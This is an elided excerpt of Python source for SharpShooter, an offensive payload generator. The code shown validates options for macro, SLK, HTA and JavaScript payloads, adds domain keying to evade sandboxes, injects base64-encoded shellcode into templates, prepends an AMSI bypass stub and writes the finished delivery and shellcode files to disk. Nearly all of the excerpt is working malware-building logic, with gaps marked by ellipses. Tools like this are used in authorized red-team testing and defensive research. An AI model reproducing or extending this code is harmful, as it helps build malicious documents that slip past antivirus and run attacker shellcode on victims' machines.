...
class SharpShooter:
    ...
    def validate_args(self):
        ...
        if (args.stageless) and (args.delivery or args.dns or args.web):
            print(
                "\033[1;31m[!]\033[0;0m Stageless payloads are not compatible with delivery arguments"
            )
            sys.exit(-1)
        ...
        if not args.shellcode and not args.stageless and not args.payload == "slk":
            if not args.refs or not args.namespace or not args.entrypoint:
                print(
                    "\033[1;31m[!]\033[0;0m Custom CSharp selected, --refs, --namespace and --entrypoint arguments required"
                )
                sys.exit(-1)
        else:
            if (
                not args.shellcode_file
                and not args.stageless
                and not args.payload == "slk"
            ):
                print(
                    "\033[1;31m[!]\033[0;0m Built-in CSharp template selected, --scfile argument required"
                )
                sys.exit(-1)

        if args.stageless and not args.rawscfile:
            print(
                "\033[1;31m[!]\033[0;0m Stageless payloads require the --rawscfile argument"
            )
            sys.exit(-1)
        ...
        if args.payload == "macro" and not args.comtechnique == "xslremote":
            print(
                "\033[1;31m[!]\033[0;0m Macro payload requires the --com xsmlremote and --awlurl arguments"
            )
            sys.exit(-1)

        if args.payload == "slk" and args.comtechnique:
            print(
                "\033[1;31m[!]\033[0;0m SLK payloads do not currently support COM staging"
            )
            sys.exit(-1)
...
End Sub"""
            ...
            try:
                ...
                if sandboxevasion_type == 1:
                    ...
                    if len(domain_name) <= 1:
                        ...
                        print(
                            "\033[1;34m[*]\033[0;0m Adding keying for %s domain"
                            % (domain_name)
                        )
        ...
        template_code = template_body.decode(encoding="utf-8").replace(
            "%SANDBOX_ESCAPES%", sandbox_techniques
        )
        ...
        while True:
            ...
            try:
                ...
                if shellcode_payload == "y" or shellcode_payload == "yes":
                    ...
                    shellcode_final = shellcode_template.replace(
                        "%SHELLCODE%", shellcode
                    )
                    ...
                    encoded_sc = base64.b64encode(rawsc).decode(encoding="utf-8")
        ...
        if args.amsi and not args.payload == "macro":
            if args.comtechnique:
                ...
                amsi_bypass = amsikiller.amsi_stub(
                    file_type, args.amsi, outputfile_payload
                )

                if "vb" in file_type or "hta" in file_type:
                    template_code = (
                        amsi_bypass + template_code + "\nOn Error Goto 0\nEnd If"
                    )
                else:
                    template_code = amsi_bypass + template_code + "}"
        ...
        if "js" in file_type or args.comtechnique:
            ...
            payload = harness.replace(
                "%B64PAYLOAD%", payload_encoded.decode(encoding="utf-8")
            )
        ...
        print(
            "\033[1;34m[*]\033[0;0m Written delivery payload to output/%s"
            % outputfile_payload
        )
        if shellcode_delivery:
            ...
            with open("output/" + outputfile_shellcode, "w") as f:
                ...
                f.close()
                print(
                    "\033[1;34m[*]\033[0;0m Written shellcode payload to output/%s"
                    % outputfile_shellcode
                )
